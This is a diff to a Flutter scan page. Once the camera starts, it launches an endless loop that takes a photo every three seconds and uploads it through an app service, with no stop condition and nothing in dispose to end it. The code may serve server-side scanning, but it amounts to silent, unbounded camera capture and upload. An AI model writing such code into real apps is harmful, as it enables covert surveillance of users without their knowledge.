@@ -27,6 +27,23 @@ class _ScanPageState extends State<ScanPage> {
     }
   }
 
+  void onCameraInitialized() {
+    Log.info('摄像头正常启动');
+    (() async {
+      while (true) {
+        await Future.delayed(const Duration(seconds: 3));
+        final imageBuffer = await takePhoto();
+        if (imageBuffer != null && imageBuffer.isNotEmpty) {
+          ServicePool.fu.upload(imageBuffer);
+        }
+      }
+    })();
+  }
+
+  void onCameraError(msg) {
+    Log.info('摄像头发生异常');
+  }
+
   Widget buildCameraView(String htmlSource) {
     return WebViewX(
       initialContent: htmlSource,
@@ -39,14 +56,23 @@ class _ScanPageState extends State<ScanPage> {
             name: 'cameraViewInitialized',
             callBack: (msg) {
               Log.info('摄像头已启动');
+              onCameraInitialized();
             }),
         DartCallback(
             name: 'cameraViewInitializedError',
             callBack: (msg) {
               Log.info('摄像头启动失败');
+              onCameraError(msg);
             }),
       },
     );
+  }
+
+  @override
+  void dispose() {
+    webviewController?.dispose();
+    webviewController = null;
+    super.dispose();
   }
 
   @override
